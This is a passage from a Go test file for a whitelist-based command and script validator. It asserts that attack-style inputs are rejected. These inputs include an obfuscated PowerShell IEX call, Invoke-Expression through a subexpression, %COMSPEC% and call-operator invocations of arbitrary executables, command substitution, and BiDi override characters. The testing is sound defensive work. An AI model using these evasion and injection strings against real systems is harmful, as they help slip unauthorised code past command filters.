				t.Errorf("ValidateScript(%q) error = %v, wantErr %v", tt.script, err, tt.wantErr)
			}
		})
	}
}

// TestValidateScript_InvocationResolution proves AG-H script first-token
// resolution: statements that begin with a call operator, quote, path prefix,
// or environment expansion are resolved to the invoked binary and rejected when
// that binary is not whitelisted (deny-by-default), not skipped.
func TestValidateScript_InvocationResolution(t *testing.T) {
	tests := []struct {
		name     string
		script   string
		language string
		wantErr  bool
	}{
		{
			name:     "ATTACK: relative path exe",
			script:   ".\\payload.exe -beacon",
			language: "powershell",
			wantErr:  true,
		},
		{
			name:     "ATTACK: quoted absolute path exe",
			script:   `"C:\Windows\System32\calc.exe"`,
			language: "cmd",
			wantErr:  true,
		},
		{
			name:     "ATTACK: quoted absolute path exe powershell with call op",
			script:   `& "C:\Windows\System32\calc.exe"`,
			language: "powershell",
			wantErr:  true,
		},
		{
			name:     "ATTACK: env var command comspec",
			script:   "%COMSPEC% /c evil.exe",
			language: "cmd",
			wantErr:  true,
		},
		{
			name:     "ATTACK: env var command powershell",
			script:   "$env:ComSpec /c whoami",
			language: "powershell",
			wantErr:  true,
		},
		{
			name:     "ATTACK: obfuscated IEX call operator",
			script:   "&('IE'+'X')($payload)",
			language: "powershell",
			wantErr:  true,
		},
		{
			name:     "ATTACK: subexpression invocation",
			script:   "(Get-Command Invoke-Expression) $payload",
			language: "powershell",
			wantErr:  true,
		},
		{
			name:     "ATTACK: call operator variable",
			script:   "& $maliciousCmd -arg",
			language: "powershell",
			wantErr:  true,
		},
		{
			name:     "Legit: call operator whitelisted cmdlet",
			script:   "& Get-Process",
			language: "powershell",
			wantErr:  false,
		},
		{
			name:     "Legit: bare variable evaluation",
			script:   "$result",
			language: "powershell",
			wantErr:  false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateScript(tt.script, tt.language)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateScript(%q) error = %v, wantErr %v", tt.script, err, tt.wantErr)
			}
		})
	}
}

// TestCommandSubstitution proves AG-M cmdsub: the inner command of a
// substitution is whitelist-checked in both command and script contexts.
func TestCommandSubstitution(t *testing.T) {
	if err := ValidateCommand("echo $(start-process calc)", "bash"); err == nil {
		t.Errorf("SECURITY: command substitution with non-whitelisted inner command must be rejected")
	}
	if err := ValidateScript("echo $(start-process calc)", "bash"); err == nil {
		t.Errorf("SECURITY: script command substitution with non-whitelisted inner command must be rejected")
	}
	if err := ValidateCommand("echo `start-process calc`", "bash"); err == nil {
		t.Errorf("SECURITY: backtick substitution with non-whitelisted inner command must be rejected")
	}
	// Legitimate: inner command is whitelisted.
	if err := ValidateCommand("echo $(hostname)", "bash"); err != nil {
		t.Errorf("legitimate substitution with whitelisted inner command should pass, got: %v", err)
	}
}

// TestQuotedParenNotRejected guards the regression where splitting on a bare
// ")"/"}" wrongly rejected legitimate whitelisted commands that carry those
// characters inside quoted arguments.
func TestQuotedParenNotRejected(t *testing.T) {
	legit := []string{
		`grep "foo)" file.txt`,
		`echo "hello (world)"`,
		`echo "a } b"`,
	}
	for _, cmd := range legit {
		if err := ValidateCommand(cmd, "bash"); err != nil {
			t.Errorf("legitimate command with quoted paren/brace must pass, got rejected: %q -> %v", cmd, err)
		}
	}
	// The substitution attack must still be rejected even with the trim in place.
	if err := ValidateCommand("echo $(start-process calc)", "bash"); err == nil {
		t.Errorf("SECURITY: substitution attack must still be rejected after quoted-paren fix")
	}
}

func TestSanitizeArguments(t *testing.T) {
	tests := []struct {
		name    string
		command string
		wantErr bool
	}{
		{
			name:    "Normal command",
			command: "systeminfo",
			wantErr: false,
		},
		{
			name:    "Command with reasonable special chars",
			command: "ps aux | grep test",
			wantErr: false,
		},
		{
			name:    "Command with excessive special chars",
			command: "cmd | | | | | | | | | | | cmd",
			wantErr: true,
		},
		{
			name:    "Command with BiDi override",
			command: "test\u202Ecmd",
			wantErr: true,
		},
		{
			name:    "Command with non-printable chars",
			command: "test\x01cmd",
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := sanitizeArguments(tt.command)
			if (err != nil) != tt.wantErr {
				t.Errorf("sanitizeArguments() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}
